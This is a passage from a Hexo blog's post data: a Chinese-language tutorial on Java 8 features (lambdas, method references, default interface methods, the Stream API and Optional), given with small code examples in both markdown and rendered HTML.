lambda表达式可以方便的和以下一些特性结合使用。 </strong><br>\n\n## 2.形式\n\n```\n// 1. 不需要参数,返回值为 5  \n() -> 5  \n\n// 2. 接收一个参数(数字类型),返回其2倍的值  \nx -> 2 * x  \n\n// 3. 接受2个参数(数字),并返回他们的差值  \n(x, y) -> x – y  \n\n// 4. 接收2个int型整数,返回他们的和  \n(int x, int y) -> x + y  \n\n// 5. 接受一个 string 对象,并在控制台打印,不返回任何值(看起来像是返回void)  \n(String s) -> System.out.print(s)\n```\n\n# 二. :: 方法引用\n\n## 1.目的\n\n简化代码\n\n## 2.例子\n\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"3\");\n\n//forEach\nfor(String s:list){\n   System.out.println(s);\n}\n\n//lambda\nlist.forEach(e -> System.out.println(e));\n\n//::\nlist.forEach(System.out::println);\n```\n\n# 三.接口默认方法\n\n## 1.意义\n\n接口与其实现类之间的 耦合度 太高了（tightly coupled），当需要为一个接口添加方法时，所有的实现类都必须随之修改。默认方法解决了这个问题，它可以为接口添加新的方法，而不会破坏已有的接口的实现。<br>\n\n\n## 2.样例\n\n```\npublic class MyTest {\n\n    public static void main(String[] args){\n        new MyTest().new A().testA();\n    }\n\n    interface InterfaceA{\n        default void test(){\n            System.out.println(\"a\");\n        }\n    }\n\n    class A implements InterfaceA{\n        public void testA(){\n            new A().test();\n        }\n    }\n}\n```\n\n# 四.Stream\n\nhttps://www.ibm.com/developerworks/cn/java/j-lo-java8streamapi/index.html\n\n## 1.意义\n\n函数式编程？？\n\n对集合功能的增强，提供便利的聚合操作\n\n\n\n## 2.使用\n\n简单说，对 Stream 的使用就是实现一个 filter-map-reduce 过程，产生一个最终结果，或者导致一个副作用（side effect）\n\n### 1.流\n\n```\n//串行流\nCollection.Stream()\n\n//并行流\nCollection.parallelStream()\n```\n常用构造方式\n```\n// 1. Individual values\nStream stream = Stream.of(\"a\", \"b\", \"c\");\n// 2. Arrays\nString [] strArray = new String[] {\"a\", \"b\", \"c\"};\nstream = Stream.of(strArray);\nstream = Arrays.stream(strArray);\n// 3. Collections\nList<String> list = Arrays.asList(strArray);\nstream = list.stream();\n```\n\n### 2.操作类型\n\n\n- Intermediate  中间操作\n\nmap (mapToInt, flatMap 等)、 filter、 distinct、 sorted、 peek、 limit、 skip、 parallel、 sequential、 unordered<br>\n\n一个流可以后面跟随零个或多个 intermediate 操作。其目的主要是打开流，做出某种程度的数据映射/过滤，然后返回一个新的流，交给下一个操作使用。这类操作都是惰性化的（lazy），就是说，仅仅调用到这类方法，并没有真正开始流的遍历。\n\n- Terminal   终结操作\n\nforEach、 forEachOrdered、 toArray、 reduce、 collect、 min、 max、 count、 anyMatch、 allMatch、 noneMatch、 findFirst、 findAny、 iterator<br>\n\n一个流只能有一个 terminal 操作，当这个操作执行后，流就被使用“光”了，无法再被操作。所以这必定是流的最后一个操作。Terminal 操作的执行，才会真正开始流的遍历，并且会生成一个结果，或者一个 side effect。\n\n- short-circuiting 短路\n\nanyMatch、 allMatch、 noneMatch、 findFirst、 findAny、 limit<br>\n\n当操作一个无限大的 Stream，而又希望在有限时间内完成操作，则在管道内拥有一个 short-circuiting 操作是必要非充分条件。\n\n### 3.操作例子\n\n- filter\n\n对stream进行过滤, 满足过滤条件的留下\n\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nlist.stream().filter(a -> a.equals(\"2\")).forEach(System.out::println);\n// result: 2 2\n```\n\n- map\n\nmap 对元素进行某种转换处理，得到结果，一一映射。<br>\n\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nlist.stream().map(String::hashCode).forEach(System.out::println);\n// result: 49 50 50 51\n```\n\nmapToInt 将元素转成int类型\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nlist.stream().mapToInt(data -> Integer.parseInt(data)).forEach(System.out::println);\n```\n\nflatMap 是将Stream中的每个元素都转换成Stream类型，然后将每个Stream的元素提出取来，聚合成一个最外围的Stream<br>\n\n例子：将两个Stream组合成一个\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nList<String> list2 = Arrays.asList(\"4\",\"5\",\"6\");\nStream.of(list, list2).flatMap(List::stream).forEach(System.out::println);\n//result: 1 2 2 3 4 5 6\n```\n两个list去重合并：\n```\n\nList<String> list1 = Arrays.asList(\"1\",\"2\",\"3\",\"4\");\nList<String> list2 = Arrays.asList(\"3\",\"4\",\"5\",\"6\");\n\nList list = Stream.of(list1, list2).flatMap(List::stream).distinct().collect(Collectors.toList());\n\nlist.stream().forEach( System.out::println);\n```\n\n- reduce\n\n终结操作，把 Stream 元素组合起来\n\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nList<String> list2 = Arrays.asList(\"4\",\"5\",\"6\");\nOptional<String> s = Stream.of(list, list2).flatMap(List::stream).reduce(String::concat);\ns.ifPresent(System.out::println);\n//result: 1223456\n```\n\n- forEach\n\n终结操作，遍历stream中的元素<br>\n\n可用 <strong>peek</strong> 来遍历，中间操作<br>\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nlist.stream().peek(System.out::println).map(e -> e + \"map\").peek(System.out::println).count();\n//result:\n1\n1map\n2\n2map\n2\n2map\n3\n3map\n```\n- limit/skip\n\nlimit 得到前n个元素，skip 抛弃前n个元素\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nlist.stream().limit(3).skip(1).forEach(System.out::println);\n//result: 2 2\n```\n\n- Match\n\nallMatch：Stream 中全部元素符合传入的 predicate，返回 true<br>\nanyMatch：Stream 中只要有一个元素符合传入的 predicate，返回 true<br>\nnoneMatch：Stream 中没有一个元素符合传入的 predicate，返回 true<br>\n\n```\nboolean flag = list.stream().limit(3).anyMatch(e -> e.equals(\"2\"));\n```\n\n# 五.optional\n\n\nhttps://www.zhihu.com/question/20125256\n\n## 1.意义\n\nOptional<T>配合Lambda可以使Java对于null的处理变的异常优雅<br>\n\n## 2.例子\n\n```\nOptional<String> s = Optional.ofNullable(null);\n\n//1.存在则操作\ns.ifPresent(System.out::println);\n\n//2.存在则返回，否则返回其它\ns.orElse(\"0\");\n\n//3.简化if-else ,多个if-else时效果明显\n// if s 存在 则 转大写并+ a  else null\ns.map(e -> e.toUpperCase()).map(e2 -> e2.concat(\"a\")).orElse(\"null\");\n```\n","source":"_posts/java/java8新特性.md","raw":"---\ntitle: java8新特性\ndate: 2019-08-012 19:07:33\ntags: [java]\n---\n\njava8 方便了函数式编程<br>\n\n# 一.lambda表达式\n\n## 1.意义\n\nlambda函数比较轻便，即用即仍，很适合需要完成一项功能，但是此功能只在此一处使用，连名字都很随意的情况下<br>\n\n<strong> lambda表达式可以方便的和以下一些特性结合使用。 </strong><br>\n\n## 2.形式\n\n```\n// 1. 不需要参数,返回值为 5  \n() -> 5  \n\n// 2. 接收一个参数(数字类型),返回其2倍的值  \nx -> 2 * x  \n\n// 3. 接受2个参数(数字),并返回他们的差值  \n(x, y) -> x – y  \n\n// 4. 接收2个int型整数,返回他们的和  \n(int x, int y) -> x + y  \n\n// 5. 接受一个 string 对象,并在控制台打印,不返回任何值(看起来像是返回void)  \n(String s) -> System.out.print(s)\n```\n\n# 二. :: 方法引用\n\n## 1.目的\n\n简化代码\n\n## 2.例子\n\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"3\");\n\n//forEach\nfor(String s:list){\n   System.out.println(s);\n}\n\n//lambda\nlist.forEach(e -> System.out.println(e));\n\n//::\nlist.forEach(System.out::println);\n```\n\n# 三.接口默认方法\n\n## 1.意义\n\n接口与其实现类之间的 耦合度 太高了（tightly coupled），当需要为一个接口添加方法时，所有的实现类都必须随之修改。默认方法解决了这个问题，它可以为接口添加新的方法，而不会破坏已有的接口的实现。<br>\n\n\n## 2.样例\n\n```\npublic class MyTest {\n\n    public static void main(String[] args){\n        new MyTest().new A().testA();\n    }\n\n    interface InterfaceA{\n        default void test(){\n            System.out.println(\"a\");\n        }\n    }\n\n    class A implements InterfaceA{\n        public void testA(){\n            new A().test();\n        }\n    }\n}\n```\n\n# 四.Stream\n\nhttps://www.ibm.com/developerworks/cn/java/j-lo-java8streamapi/index.html\n\n## 1.意义\n\n函数式编程？？\n\n对集合功能的增强，提供便利的聚合操作\n\n\n\n## 2.使用\n\n简单说，对 Stream 的使用就是实现一个 filter-map-reduce 过程，产生一个最终结果，或者导致一个副作用（side effect）\n\n### 1.流\n\n```\n//串行流\nCollection.Stream()\n\n//并行流\nCollection.parallelStream()\n```\n常用构造方式\n```\n// 1. Individual values\nStream stream = Stream.of(\"a\", \"b\", \"c\");\n// 2. Arrays\nString [] strArray = new String[] {\"a\", \"b\", \"c\"};\nstream = Stream.of(strArray);\nstream = Arrays.stream(strArray);\n// 3. Collections\nList<String> list = Arrays.asList(strArray);\nstream = list.stream();\n```\n\n### 2.操作类型\n\n\n- Intermediate  中间操作\n\nmap (mapToInt, flatMap 等)、 filter、 distinct、 sorted、 peek、 limit、 skip、 parallel、 sequential、 unordered<br>\n\n一个流可以后面跟随零个或多个 intermediate 操作。其目的主要是打开流，做出某种程度的数据映射/过滤，然后返回一个新的流，交给下一个操作使用。这类操作都是惰性化的（lazy），就是说，仅仅调用到这类方法，并没有真正开始流的遍历。\n\n- Terminal   终结操作\n\nforEach、 forEachOrdered、 toArray、 reduce、 collect、 min、 max、 count、 anyMatch、 allMatch、 noneMatch、 findFirst、 findAny、 iterator<br>\n\n一个流只能有一个 terminal 操作，当这个操作执行后，流就被使用“光”了，无法再被操作。所以这必定是流的最后一个操作。Terminal 操作的执行，才会真正开始流的遍历，并且会生成一个结果，或者一个 side effect。\n\n- short-circuiting 短路\n\nanyMatch、 allMatch、 noneMatch、 findFirst、 findAny、 limit<br>\n\n当操作一个无限大的 Stream，而又希望在有限时间内完成操作，则在管道内拥有一个 short-circuiting 操作是必要非充分条件。\n\n### 3.操作例子\n\n- filter\n\n对stream进行过滤, 满足过滤条件的留下\n\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nlist.stream().filter(a -> a.equals(\"2\")).forEach(System.out::println);\n// result: 2 2\n```\n\n- map\n\nmap 对元素进行某种转换处理，得到结果，一一映射。<br>\n\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nlist.stream().map(String::hashCode).forEach(System.out::println);\n// result: 49 50 50 51\n```\n\nmapToInt 将元素转成int类型\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nlist.stream().mapToInt(data -> Integer.parseInt(data)).forEach(System.out::println);\n```\n\nflatMap 是将Stream中的每个元素都转换成Stream类型，然后将每个Stream的元素提出取来，聚合成一个最外围的Stream<br>\n\n例子：将两个Stream组合成一个\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nList<String> list2 = Arrays.asList(\"4\",\"5\",\"6\");\nStream.of(list, list2).flatMap(List::stream).forEach(System.out::println);\n//result: 1 2 2 3 4 5 6\n```\n两个list去重合并：\n```\n\nList<String> list1 = Arrays.asList(\"1\",\"2\",\"3\",\"4\");\nList<String> list2 = Arrays.asList(\"3\",\"4\",\"5\",\"6\");\n\nList list = Stream.of(list1, list2).flatMap(List::stream).distinct().collect(Collectors.toList());\n\nlist.stream().forEach( System.out::println);\n```\n\n- reduce\n\n终结操作，把 Stream 元素组合起来\n\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nList<String> list2 = Arrays.asList(\"4\",\"5\",\"6\");\nOptional<String> s = Stream.of(list, list2).flatMap(List::stream).reduce(String::concat);\ns.ifPresent(System.out::println);\n//result: 1223456\n```\n\n- forEach\n\n终结操作，遍历stream中的元素<br>\n\n可用 <strong>peek</strong> 来遍历，中间操作<br>\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nlist.stream().peek(System.out::println).map(e -> e + \"map\").peek(System.out::println).count();\n//result:\n1\n1map\n2\n2map\n2\n2map\n3\n3map\n```\n- limit/skip\n\nlimit 得到前n个元素，skip 抛弃前n个元素\n```\nList<String> list = Arrays.asList(\"1\",\"2\",\"2\",\"3\");\nlist.stream().limit(3).skip(1).forEach(System.out::println);\n//result: 2 2\n```\n\n- Match\n\nallMatch：Stream 中全部元素符合传入的 predicate，返回 true<br>\nanyMatch：Stream 中只要有一个元素符合传入的 predicate，返回 true<br>\nnoneMatch：Stream 中没有一个元素符合传入的 predicate，返回 true<br>\n\n```\nboolean flag = list.stream().limit(3).anyMatch(e -> e.equals(\"2\"));\n```\n\n# 五.optional\n\n\nhttps://www.zhihu.com/question/20125256\n\n## 1.意义\n\nOptional<T>配合Lambda可以使Java对于null的处理变的异常优雅<br>\n\n## 2.例子\n\n```\nOptional<String> s = Optional.ofNullable(null);\n\n//1.存在则操作\ns.ifPresent(System.out::println);\n\n//2.存在则返回，否则返回其它\ns.orElse(\"0\");\n\n//3.简化if-else ,多个if-else时效果明显\n// if s 存在 则 转大写并+ a  else null\ns.map(e -> e.toUpperCase()).map(e2 -> e2.concat(\"a\")).orElse(\"null\");\n```\n","slug":"java/java8新特性","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321hl000p6dcp48f22rcz","content":"<p>java8 方便了函数式编程<br></p>\n<h1 id=\"一-lambda表达式\"><a href=\"#一-lambda表达式\" class=\"headerlink\" title=\"一.lambda表达式\"></a>一.lambda表达式</h1><h2 id=\"1-意义\"><a href=\"#1-意义\" class=\"headerlink\" title=\"1.意义\"></a>1.意义</h2><p>lambda函数比较轻便，即用即仍，很适合需要完成一项功能，但是此功能只在此一处使用，连名字都很随意的情况下<br></p>\n<p><strong> lambda表达式可以方便的和以下一些特性结合使用。 </strong><br></p>\n<h2 id=\"2-形式\"><a href=\"#2-形式\" class=\"headerlink\" title=\"2.形式\"></a>2.形式</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 1. 不需要参数,返回值为 5  </span><br><span class=\"line\">() -&gt; 5  </span><br><span class=\"line\"></span><br><span class=\"line\">// 2. 接收一个参数(数字类型),返回其2倍的值  </span><br><span class=\"line\">x -&gt; 2 * x  </span><br><span class=\"line\"></span><br><span class=\"line\">// 3. 接受2个参数(数字),并返回他们的差值  </span><br><span class=\"line\">(x, y) -&gt; x – y  </span><br><span class=\"line\"></span><br><span class=\"line\">// 4. 接收2个int型整数,返回他们的和  </span><br><span class=\"line\">(int x, int y) -&gt; x + y  </span><br><span class=\"line\"></span><br><span class=\"line\">// 5. 接受一个 string 对象,并在控制台打印,不返回任何值(看起来像是返回void)  </span><br><span class=\"line\">(String s) -&gt; System.out.print(s)</span><br></pre></td></tr></table></figure>\n<h1 id=\"二-方法引用\"><a href=\"#二-方法引用\" class=\"headerlink\" title=\"二. :: 方法引用\"></a>二. :: 方法引用</h1><h2 id=\"1-目的\"><a href=\"#1-目的\" class=\"headerlink\" title=\"1.目的\"></a>1.目的</h2><p>简化代码</p>\n<h2 id=\"2-例子\"><a href=\"#2-例子\" class=\"headerlink\" title=\"2.例子\"></a>2.例子</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">//forEach</span><br><span class=\"line\">for(String s:list)&#123;</span><br><span class=\"line\">   System.out.println(s);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//lambda</span><br><span class=\"line\">list.forEach(e -&gt; System.out.println(e));</span><br><span class=\"line\"></span><br><span class=\"line\">//::</span><br><span class=\"line\">list.forEach(System.out::println);</span><br></pre></td></tr></table></figure>\n<h1 id=\"三-接口默认方法\"><a href=\"#三-接口默认方法\" class=\"headerlink\" title=\"三.接口默认方法\"></a>三.接口默认方法</h1><h2 id=\"1-意义-1\"><a href=\"#1-意义-1\" class=\"headerlink\" title=\"1.意义\"></a>1.意义</h2><p>接口与其实现类之间的 耦合度 太高了（tightly coupled），当需要为一个接口添加方法时，所有的实现类都必须随之修改。默认方法解决了这个问题，它可以为接口添加新的方法，而不会破坏已有的接口的实现。<br></p>\n<h2 id=\"2-样例\"><a href=\"#2-样例\" class=\"headerlink\" title=\"2.样例\"></a>2.样例</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MyTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        new MyTest().new A().testA();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    interface InterfaceA&#123;</span><br><span class=\"line\">        default void test()&#123;</span><br><span class=\"line\">            System.out.println(&quot;a&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class A implements InterfaceA&#123;</span><br><span class=\"line\">        public void testA()&#123;</span><br><span class=\"line\">            new A().test();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"四-Stream\"><a href=\"#四-Stream\" class=\"headerlink\" title=\"四.Stream\"></a>四.Stream</h1><p><a href=\"https://www.ibm.com/developerworks/cn/java/j-lo-java8streamapi/index.html\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/developerworks/cn/java/j-lo-java8streamapi/index.html</a></p>\n<h2 id=\"1-意义-2\"><a href=\"#1-意义-2\" class=\"headerlink\" title=\"1.意义\"></a>1.意义</h2><p>函数式编程？？</p>\n<p>对集合功能的增强，提供便利的聚合操作</p>\n<h2 id=\"2-使用\"><a href=\"#2-使用\" class=\"headerlink\" title=\"2.使用\"></a>2.使用</h2><p>简单说，对 Stream 的使用就是实现一个 filter-map-reduce 过程，产生一个最终结果，或者导致一个副作用（side effect）</p>\n<h3 id=\"1-流\"><a href=\"#1-流\" class=\"headerlink\" title=\"1.流\"></a>1.流</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//串行流</span><br><span class=\"line\">Collection.Stream()</span><br><span class=\"line\"></span><br><span class=\"line\">//并行流</span><br><span class=\"line\">Collection.parallelStream()</span><br></pre></td></tr></table></figure>\n<p>常用构造方式<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 1. Individual values</span><br><span class=\"line\">Stream stream = Stream.of(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;);</span><br><span class=\"line\">// 2. Arrays</span><br><span class=\"line\">String [] strArray = new String[] &#123;&quot;a&quot;, &quot;b&quot;, &quot;c&quot;&#125;;</span><br><span class=\"line\">stream = Stream.of(strArray);</span><br><span class=\"line\">stream = Arrays.stream(strArray);</span><br><span class=\"line\">// 3. Collections</span><br><span class=\"line\">List&lt;String&gt; list = Arrays.asList(strArray);</span><br><span class=\"line\">stream = list.stream();</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2-操作类型\"><a href=\"#2-操作类型\" class=\"headerlink\" title=\"2.操作类型\"></a>2.操作类型</h3><ul>\n<li>Intermediate  中间操作</li>\n</ul>\n<p>map (mapToInt, flatMap 等)、 filter、 distinct、 sorted、 peek、 limit、 skip、 parallel、 sequential、 unordered<br></p>\n<p>一个流可以后面跟随零个或多个 intermediate 操作。其目的主要是打开流，做出某种程度的数据映射/过滤，然后返回一个新的流，交给下一个操作使用。这类操作都是惰性化的（lazy），就是说，仅仅调用到这类方法，并没有真正开始流的遍历。</p>\n<ul>\n<li>Terminal   终结操作</li>\n</ul>\n<p>forEach、 forEachOrdered、 toArray、 reduce、 collect、 min、 max、 count、 anyMatch、 allMatch、 noneMatch、 findFirst、 findAny、 iterator<br></p>\n<p>一个流只能有一个 terminal 操作，当这个操作执行后，流就被使用“光”了，无法再被操作。所以这必定是流的最后一个操作。Terminal 操作的执行，才会真正开始流的遍历，并且会生成一个结果，或者一个 side effect。</p>\n<ul>\n<li>short-circuiting 短路</li>\n</ul>\n<p>anyMatch、 allMatch、 noneMatch、 findFirst、 findAny、 limit<br></p>\n<p>当操作一个无限大的 Stream，而又希望在有限时间内完成操作，则在管道内拥有一个 short-circuiting 操作是必要非充分条件。</p>\n<h3 id=\"3-操作例子\"><a href=\"#3-操作例子\" class=\"headerlink\" title=\"3.操作例子\"></a>3.操作例子</h3><ul>\n<li>filter</li>\n</ul>\n<p>对stream进行过滤, 满足过滤条件的留下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">list.stream().filter(a -&gt; a.equals(&quot;2&quot;)).forEach(System.out::println);</span><br><span class=\"line\">// result: 2 2</span><br></pre></td></tr></table></figure>\n<ul>\n<li>map</li>\n</ul>\n<p>map 对元素进行某种转换处理，得到结果，一一映射。<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">list.stream().map(String::hashCode).forEach(System.out::println);</span><br><span class=\"line\">// result: 49 50 50 51</span><br></pre></td></tr></table></figure>\n<p>mapToInt 将元素转成int类型<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">list.stream().mapToInt(data -&gt; Integer.parseInt(data)).forEach(System.out::println);</span><br></pre></td></tr></table></figure></p>\n<p>flatMap 是将Stream中的每个元素都转换成Stream类型，然后将每个Stream的元素提出取来，聚合成一个最外围的Stream<br></p>\n<p>例子：将两个Stream组合成一个<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">List&lt;String&gt; list2 = Arrays.asList(&quot;4&quot;,&quot;5&quot;,&quot;6&quot;);</span><br><span class=\"line\">Stream.of(list, list2).flatMap(List::stream).forEach(System.out::println);</span><br><span class=\"line\">//result: 1 2 2 3 4 5 6</span><br></pre></td></tr></table></figure></p>\n<p>两个list去重合并：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">List&lt;String&gt; list1 = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;);</span><br><span class=\"line\">List&lt;String&gt; list2 = Arrays.asList(&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">List list = Stream.of(list1, list2).flatMap(List::stream).distinct().collect(Collectors.toList());</span><br><span class=\"line\"></span><br><span class=\"line\">list.stream().forEach( System.out::println);</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>reduce</li>\n</ul>\n<p>终结操作，把 Stream 元素组合起来</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">List&lt;String&gt; list2 = Arrays.asList(&quot;4&quot;,&quot;5&quot;,&quot;6&quot;);</span><br><span class=\"line\">Optional&lt;String&gt; s = Stream.of(list, list2).flatMap(List::stream).reduce(String::concat);</span><br><span class=\"line\">s.ifPresent(System.out::println);</span><br><span class=\"line\">//result: 1223456</span><br></pre></td></tr></table></figure>\n<ul>\n<li>forEach</li>\n</ul>\n<p>终结操作，遍历stream中的元素<br></p>\n<p>可用 <strong>peek</strong> 来遍历，中间操作<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">list.stream().peek(System.out::println).map(e -&gt; e + &quot;map&quot;).peek(System.out::println).count();</span><br><span class=\"line\">//result:</span><br><span class=\"line\">1</span><br><span class=\"line\">1map</span><br><span class=\"line\">2</span><br><span class=\"line\">2map</span><br><span class=\"line\">2</span><br><span class=\"line\">2map</span><br><span class=\"line\">3</span><br><span class=\"line\">3map</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>limit/skip</li>\n</ul>\n<p>limit 得到前n个元素，skip 抛弃前n个元素<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">list.stream().limit(3).skip(1).forEach(System.out::println);</span><br><span class=\"line\">//result: 2 2</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>Match</li>\n</ul>\n<p>allMatch：Stream 中全部元素符合传入的 predicate，返回 true<br><br>anyMatch：Stream 中只要有一个元素符合传入的 predicate，返回 true<br><br>noneMatch：Stream 中没有一个元素符合传入的 predicate，返回 true<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">boolean flag = list.stream().limit(3).anyMatch(e -&gt; e.equals(&quot;2&quot;));</span><br></pre></td></tr></table></figure>\n<h1 id=\"五-optional\"><a href=\"#五-optional\" class=\"headerlink\" title=\"五.optional\"></a>五.optional</h1><p><a href=\"https://www.zhihu.com/question/20125256\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/20125256</a></p>\n<h2 id=\"1-意义-3\"><a href=\"#1-意义-3\" class=\"headerlink\" title=\"1.意义\"></a>1.意义</h2><p>Optional<t>配合Lambda可以使Java对于null的处理变的异常优雅<br></t></p>\n<h2 id=\"2-例子-1\"><a href=\"#2-例子-1\" class=\"headerlink\" title=\"2.例子\"></a>2.例子</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Optional&lt;String&gt; s = 